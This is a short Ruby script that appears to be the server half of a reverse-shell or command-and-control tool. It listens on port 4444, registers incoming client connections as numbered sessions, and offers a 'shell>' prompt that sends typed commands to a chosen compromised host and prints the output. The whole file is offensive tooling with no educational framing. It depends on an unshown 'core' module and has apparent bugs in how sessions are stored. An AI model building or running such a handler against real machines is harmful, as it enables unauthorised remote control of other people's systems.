#!/usr/bin/env ruby
require 'socket'
require './core'
include MainCommands
def main_shell()
	main = Readline.readline('main> ', true)
	case main.split(' ')[0]
		when 'list_sessions'
			list_sessions(@clients)
		when 'help'
			help()
		when 'exit'
			exit
	  when 'use_session'
	    session_id = main.split(' ')[1]
			use_session(@clients[:"#{session_id}"]) 
		else
			print_error("Command #{main} not found\n") 
			main_shell()
	end
  rescue => e
	  print_error("#{e}\n")
	  main_shell()
end
def command_client(client)
	loop {
		command = [(print ("shell> ")), $stdin.gets.rstrip][1]
		client.print("#{command}")
		case command
		  when 'exit'
				exit
			when ''
				command_client(client)
      when 'background'
				background()
		end
		out_put = ''
		recv_length = 1024
		while (tmp = client.recv(recv_length))
			out_put += tmp
			break if tmp.length < recv_length
		end
		puts out_put.chomp
	}
end
begin
	@clients = {}
	client_id = "0"
	server = TCPServer.open(4444)
  Thread.new {
    loop {
      Thread.start(server.accept) do |client|  
		    client_name = client.recv(1024)
			  print_success("#{client_name}\n")
			  @clients[:"#{client_id}"] = client_name
			  client_id = client_id.to_i
			  client_id += 1
			  client_id = client_id.to_s
		  end
     }
	}
  main_shell()
	rescue => error
    print_error("#{error}\n")
end
